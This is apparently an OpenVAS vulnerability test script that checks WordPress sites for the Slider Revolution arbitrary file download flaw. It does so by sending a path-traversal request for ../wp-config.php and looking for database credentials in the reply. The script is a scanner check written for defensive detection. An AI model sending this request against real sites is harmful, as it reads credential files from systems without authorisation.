###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wp_slider_revolution_file_download_vuln.nasl 13659 2019-02-14 08:34:21Z cfischer $
#
# Wordpress Slider Revolution Arbitrary File Download Vulnerability
#
# Authors:
# Shakeel <bshakeel@secpod.com>
#
# Copyright:
# Copyright (C) 2015 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805518");
  script_version("$Revision: 13659 $");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2019-02-14 09:34:21 +0100 (Thu, 14 Feb 2019) $");
  script_tag(name:"creation_date", value:"2015-03-31 12:15:41 +0530 (Tue, 31 Mar 2015)");
  script_tag(name:"qod_type", value:"remote_vul");
  script_cve_id("CVE-2015-1579", "CVE-2014-9734");
  script_name("Wordpress Slider Revolution Arbitrary File Download Vulnerability");

  script_tag(name:"summary", value:"The host is installed with Wordpress
  Slider Revolution plugin and is prone to arbitrary file download
  vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP POST
  request and check whether it is is able to download file or not.");

  script_tag(name:"insight", value:"Flaw is due to the plugin failed to
  restrict access to certain files.");

  script_tag(name:"impact", value:"Successful exploitation will allow an
  unauthenticated remote attacker to download any arbitrary file.");

  script_tag(name:"affected", value:"Wordpress Slider Revolution version
  4.1.4 and prior.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/36554");
  script_xref(name:"URL", value:"http://www.homelab.it/index.php/2014/07/28/wordpress-slider-revolution-arbitrary-file-download");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_mandatory_keys("wordpress/installed");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

function construct_get_req(url, host, useragent)
{
  wpReq = 'GET ' + url + ' HTTP/1.1\r\n' +
          'Host: ' + host + '\r\n' +
          'User-Agent: ' + useragent + '\r\n' +
          'Accept-Encoding: gzip, deflate\r\n' +
          'Connection: keep-alive\r\n\r\n';
  return wpReq;
}

if(!http_port = get_app_port(cpe:CPE)){
  exit(0);
}

if(!dir = get_app_location(cpe:CPE, port:http_port)){
  exit(0);
}

url = dir + '/wp-admin/admin-ajax.php?action=revslider_show_image' +
            '&img=../wp-config.php';

useragent = http_get_user_agent();
host = http_host_name(port:http_port);

wpReq = construct_get_req(url:url, host:host, useragent:useragent);

wpRes = http_keepalive_send_recv(port:http_port, data:wpReq);

if(wpRes && wpRes =~ "301 Moved Permanently")
{
  url1 = egrep( pattern:"Location: http://.*wp-config.php", string:wpRes);
  hostname = split(url1, sep:"/", keep:FALSE);
  if(!hostname[2]){
    exit(0);
  }

  wpReq = construct_get_req(url:url, host:hostname[2], useragent:useragent);
  wpRes = http_keepalive_send_recv(port:http_port, data:wpReq);
}

if(wpRes && "SECURE_AUTH_KEY" >< wpRes && "<?php" >< wpRes &&
  "DB_NAME" >< wpRes && "DB_USER" >< wpRes && "DB_PASSWORD" >< wpRes)
{
  report = report_vuln_url( port:http_port, url:url );
  security_message(port:http_port,data:report);
  exit(0);
}
